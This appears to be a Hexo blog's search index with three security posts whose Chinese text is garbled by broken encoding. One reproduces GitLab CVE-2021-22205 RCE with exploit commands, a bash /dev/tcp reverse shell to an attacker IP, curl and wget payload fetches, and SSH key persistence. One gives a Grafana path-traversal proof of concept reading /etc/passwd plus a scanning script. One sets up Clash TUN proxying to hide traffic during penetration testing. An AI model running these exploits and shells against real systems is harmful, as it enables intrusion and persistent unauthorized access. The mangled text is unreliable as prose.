<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>GitLabæœªæˆæƒRCE</title>
      <link href="/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/"/>
      <url>/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¥æ—©è¯¥å¤ç°å®Œçš„ï¼Œä¸­é—´å› ä¸ºå¤ªå¤šäº‹æƒ…è€½è¯¯äº†ã€‚</p><span id="more"></span><h3 id="0x01-æ¼æ´ä»‹ç»"><a href="#0x01-æ¼æ´ä»‹ç»" class="headerlink" title="0x01.æ¼æ´ä»‹ç»"></a>0x01.æ¼æ´ä»‹ç»</h3><p>GitLabæ˜¯ç¾å›½GitLabå…¬å¸çš„ä¸€æ¬¾ä½¿ç”¨Ruby on Railså¼€å‘çš„ã€è‡ªæ‰˜ç®¡çš„ã€Gitï¼ˆç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼‰é¡¹ç›®ä»“åº“åº”ç”¨ç¨‹åºã€‚ ç”±äº GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´åœ¨æœåŠ¡ç«¯è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p><h3 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02.å½±å“ç‰ˆæœ¬"></a>0x02.å½±å“ç‰ˆæœ¬</h3><p><code>11.9 &lt;=  GitLabï¼ˆCE/EEï¼‰&lt; 13.8.8</code><br><code>13.9 &lt;=  GitLabï¼ˆCE/EEï¼‰&lt; 13.9.6</code><br><code>13.10 &lt;= GitLabï¼ˆCE/EEï¼‰&lt; 13.10.3</code></p><h3 id="0x03-ç¯å¢ƒæ­å»º"><a href="#0x03-ç¯å¢ƒæ­å»º" class="headerlink" title="0x03.ç¯å¢ƒæ­å»º"></a>0x03.ç¯å¢ƒæ­å»º</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/gitlab/CVE-2021-22205/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>http://127.0.0.1:8080</code>å³å¯ã€‚</p><h3 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04.æ¼æ´å¤ç°"></a>0x04.æ¼æ´å¤ç°</h3><h4 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Al1ex/CVE-2021-22205</span><br></pre></td></tr></table></figure><h4 id="æ¢æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"><a href="#æ¢æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨" class="headerlink" title="æ¢æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"></a>æ¢æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-22205.py -v true -t http://192.168.47.156:8080/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216104712547.png" alt="image-20211216104712547"></p><h4 id="ä¸‹è½½æ–‡ä»¶"><a href="#ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸‹è½½æ–‡ä»¶"></a>ä¸‹è½½æ–‡ä»¶</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-22205.py -a true -t http://192.168.47.156:8080/ -c &quot;curl http://10.1.3.91:1234/1.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216105224401.png" alt="image-20211216105224401"></p><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#å†™å…¥shell</span><br><span class="line">python CVE-2021-22205.py -a true -t http://192.168.47.156:8080/ -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/10.1.3.91/6666 0&gt;</span><br><span class="line">&amp;1&#x27; &gt; /tmp/1.sh&quot;</span><br><span class="line">#èµ‹äºˆshellè„šæœ¬æ‰§è¡Œæƒé™</span><br><span class="line">py CVE-2021-22205.py -a true -t http://192.168.30.56/ -c &quot;chmod +x /tmp/1.sh&quot;</span><br><span class="line">#æœåŠ¡å™¨ç›‘å¬6666ç«¯å£</span><br><span class="line">nc64.exe -lvnp  6666</span><br><span class="line">#è·å–gitæƒé™</span><br><span class="line">py CVE-2021-22205.py -a true -t http://192.168.30.56/ -c &quot;/bin/bash /tmp/1.sh&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216174619254.png" alt="image-20211216174619254"></p><p>æ‰§è¡Œå®Œå‘½ä»¤åï¼ŒæˆåŠŸä¸Šçº¿ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216174715381.png" alt="image-20211216174715381"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åˆ›å»ºçš„1.shä¹Ÿåœ¨ã€‚</p><h4 id="sshå…¬é’¥ç™»å½•"><a href="#sshå…¬é’¥ç™»å½•" class="headerlink" title="sshå…¬é’¥ç™»å½•"></a>sshå…¬é’¥ç™»å½•</h4><p>é€šè¿‡<code>cat /etc/passwd</code>å¯ä»¥å‘ç°gitç”¨æˆ·å¯ä»¥è¿œç¨‹sshç™»å½•ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216182818722.png" alt="image-20211216182818722"></p><p>æˆ‘ä»¬å°†å…¬é’¥å†™åˆ°ç›®æ ‡æœºå™¨ä¸Šè¿›è¡Œç™»å½•ã€‚</p><p>æœ¬åœ°ç”Ÿæˆä¸€ä¸‹sshå…¬é’¥ï¼Œè¾“å…¥<code>ssh-keygen</code>ç„¶åä¸€è·¯å›è½¦å°±OKäº†ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216183027591.png" alt="image-20211216183027591"></p><p>ä¹‹ååˆ©ç”¨æˆ‘ä»¬ä¹‹å‰åå¼¹è·å–åˆ°çš„shellï¼Œå°†å…¬é’¥ä¸‹è½½åˆ°ç›®æ ‡æœºå™¨ä¸Šã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.1.3.91:1234/gitlab_git.pub</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211217140517410.png" alt="image-20211217140517410"></p><p>é»˜è®¤æƒ…å†µä¸‹gitç”¨æˆ·çš„authorized_keyså†…å®¹ä¸ºç©ºï¼Œå¦‚æœå­˜åœ¨å†…å®¹çš„è¯ï¼Œå…ˆå¤‡ä»½ä¸€ä¸‹ï¼Œå†å†™å…¥ã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯<code>authorized_keys</code>æ˜¯åœ¨ç”¨æˆ·ä¸‹çš„.sshç›®å½•ä¸‹ã€‚</p><p>å†™å…¥æˆåŠŸåè¿›è¡Œsshç™»å½•å³å¯ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211217142208397.png" alt="image-20211217142208397"></p><p>åç»­æœ¬æ¥æƒ³è¦æ‰‹å·¥å†åˆ©ç”¨çš„ï¼Œæ²¡æœ‰è´¦å·å¯†ç ï¼ï¼ï¼ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> GitLab </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Grafanaä»»æ„æ–‡ä»¶è¯»å–</title>
      <link href="/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘Grafanaçˆ†å‡ºäº†ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿™é‡Œåˆšå¥½å¤ç°ä¸€æ³¢</p><span id="more"></span><h3 id="ä»€ä¹ˆæ˜¯Grafana"><a href="#ä»€ä¹ˆæ˜¯Grafana" class="headerlink" title="ä»€ä¹ˆæ˜¯Grafana"></a>ä»€ä¹ˆæ˜¯Grafana</h3><p>Grafanaæ˜¯ä¸€æ¬¾ç”¨Goè¯­è¨€å¼€å‘çš„å¼€æºæ•°æ®å¯è§†åŒ–å·¥å…·ï¼Œå¯ä»¥åšæ•°æ®ç›‘æ§å’Œæ•°æ®ç»Ÿè®¡ï¼Œå¸¦æœ‰å‘Šè­¦åŠŸèƒ½ã€‚ç›®å‰ä½¿ç”¨grafanaçš„å…¬å¸æœ‰å¾ˆå¤šï¼Œå¦‚paypalã€ebayã€intelç­‰ã€‚</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p><code>Grafana            8.x</code></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/public/plugins/æ’ä»¶åç§°/../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211208094520066.png" alt="image-20211208094520066"></p><h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">args = str(sys.argv[1])</span><br><span class="line">f = open(&quot;./paload.txt&quot;)</span><br><span class="line">for line in f:</span><br><span class="line">    url = &quot;http://&quot;+args+&quot;/public/plugins/&quot;+str.rstrip(line)+&quot;/../../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url, headers=headers,timeout=(3,7),allow_redirects=False)</span><br><span class="line">    a=req.text</span><br><span class="line">    str1=&#x27;root&#x27;</span><br><span class="line">    if a in str1:</span><br><span class="line">        print(&#x27;ç¡®è®¤å­˜åœ¨&#x27;+str.rstrip(line)+&#x27;è·¯å¾„,å¹¶å­˜åœ¨æ¼æ´!&#x27;)</span><br><span class="line">        print(url)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;ä¸å­˜åœ¨æ¼æ´!&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211208095615231.png" alt="image-20211208095615231"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Grafana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clashé…ç½®TUNæ¨¡å¼</title>
      <link href="/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>Clashé»˜è®¤é…ç½®åªä¼šé…ç½®ç³»ç»Ÿä»£ç†ï¼Œè¿™æ ·åªæœ‰æµè§ˆå™¨çš„æµé‡æ˜¯èµ°çš„ä»£ç†ï¼Œè€Œå…¶ä»–ä¸€äº›è½¯ä»¶æˆ–è€…æ˜¯å‘½ä»¤è¡Œæ˜¯ä¸èµ°ä»£ç†çš„ï¼Œè¿™å¯¹æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æƒ³è¦æ›´å¥½çš„éšè—è‡ªå·±ååˆ†çš„ä¸æ–¹ä¾¿ï¼Œè€ŒClashçš„TUNæ¨¡å¼å¯ä»¥å®ç°å…¨æµé‡çš„ä»£ç†ã€‚ğŸ˜ŠğŸ˜Š</p><span id="more"></span><h3 id="TUNæ¨¡å¼é…ç½®"><a href="#TUNæ¨¡å¼é…ç½®" class="headerlink" title="TUNæ¨¡å¼é…ç½®"></a>TUNæ¨¡å¼é…ç½®</h3><p>ä»<code>Clash v0.17.2</code>å¼€å§‹ï¼Œæˆ‘ä»¬å°±ä¸éœ€è¦è‡ªå·±å»ä¸‹è½½wintun.dllæ–‡ä»¶äº†ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰“å¼€Clashã€‚</p><ol><li>ç‚¹å‡»<code>General</code>ä¸­<code>Service Mode</code>å³è¾¹çš„<code>Manage</code>ã€‚åœ¨æ‰“å¼€çš„çª—å£å®‰è£…æœåŠ¡æ¨¡å¼ï¼Œå®‰è£…å®Œæˆåä¼šè‡ªåŠ¨é‡å¯ï¼Œåªè¦<code>Service Mode</code>å³è¾¹çš„åœ°çƒå˜æˆç»¿è‰²çš„ï¼Œå°±ä»£è¡¨å®‰è£…æˆåŠŸäº†ã€‚</li><li>è¿›å…¥<code>Settingsé¡µé¢</code> <strong>&gt;</strong> <code>Profile Mixin</code> <strong>&gt;</strong> <code>YAML</code> <strong>&gt;</strong> <code>Edit</code></li><li>è¿”å›<code>general</code>é¡µé¢å¼€å¯<code>Mixin</code>å³å¯</li></ol><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœä½ åœ¨é…ç½®ä¹‹å‰éœ€è¦å°†<code>general</code>é¡µé¢çš„<code>Mixin</code>å…³é—­ï¼Œå¦‚æœæ²¡æœ‰å…³é—­å°±é…ç½®å®Œäº†ï¼Œéœ€è¦åœ¨é…ç½®å®Œæˆåè¿›è¡Œé‡å¯Clashã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mixin: # object</span><br><span class="line">  dns:</span><br><span class="line">    enable: true</span><br><span class="line">    enhanced-mode: redir-host</span><br><span class="line">    nameserver:</span><br><span class="line">    - 119.29.29.29</span><br><span class="line">    - 223.5.5.5</span><br><span class="line">    - 223.6.6.6</span><br><span class="line">  tun:</span><br><span class="line">    enable: true</span><br><span class="line">    stack: gvisor</span><br><span class="line">    dns-hijack:</span><br><span class="line">    - 198.18.0.2:53</span><br><span class="line">    macOS-auto-route: true</span><br><span class="line">    macOS-auto-detect-interface: true</span><br></pre></td></tr></table></figure><p>å…¨éƒ½é…ç½®å®Œåï¼Œæ‰“å¼€<code>æ§åˆ¶é¢æ¿</code> &gt; <code>ç½‘ç»œå’Œ Internet</code> &gt; <code>ç½‘ç»œå’Œå…±äº«ä¸­å¿ƒ</code> &gt; å·¦ä¾§<code>æ›´æ”¹é€‚é…å™¨è®¾ç½®</code>ï¼Œæ‰¾åˆ°åç§°ä¸º<code>Clash</code>ä¸”æè¿°ä¸º<code>Clash Tunnel</code>çš„é€‚é…å™¨ï¼Œå¦‚æœæ˜¾ç¤ºå·²å¯ç”¨ï¼Œè¯´æ˜tapæ¨¡å¼æˆåŠŸå¼€å¯</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211203175920217.png" alt="image-20211203175920217"></p><p>æœ€åè®°å¾—æƒ³è¦å…¨éƒ¨ä»£ç†æµé‡ï¼Œé€‰å…¨å±€ï¼ï¼ï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> Clash </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
